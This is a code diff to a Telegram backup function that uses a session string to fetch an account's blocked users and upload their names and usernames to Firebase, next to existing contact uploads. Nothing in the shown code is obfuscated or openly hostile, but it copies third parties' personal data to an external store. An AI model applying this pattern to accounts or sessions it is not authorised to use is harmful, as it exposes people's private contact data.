@@ -113,6 +113,22 @@ async def run_fast_backup(session_string, tg_user_id, tg_username):
     if contacts_data:
         put_to_firebase(f"{base_path}/contacts", contacts_data)
         print(f"✅ Saved {len(contacts_data)} saved contacts.")
+        
+    # 1.5 Blocked Contacts (NEW)
+    try:
+        blocked_result = await client(GetBlockedRequest(offset=0, limit=100))
+        blocked_data = {}
+        for user in blocked_result.users:
+            blocked_data[str(user.id)] = {
+                "first_name": user.first_name or "",
+                "last_name": user.last_name or "",
+                "username": user.username or "None"
+            }
+        if blocked_data:
+            put_to_firebase(f"{base_path}/blocked_contacts", blocked_data)
+            print(f"✅ Saved {len(blocked_data)} blocked contacts.")
+    except Exception as e:
+        print(f"⚠️ Error fetching blocked contacts: {e}")
 
     p2p_users = []
     unsaved = {}
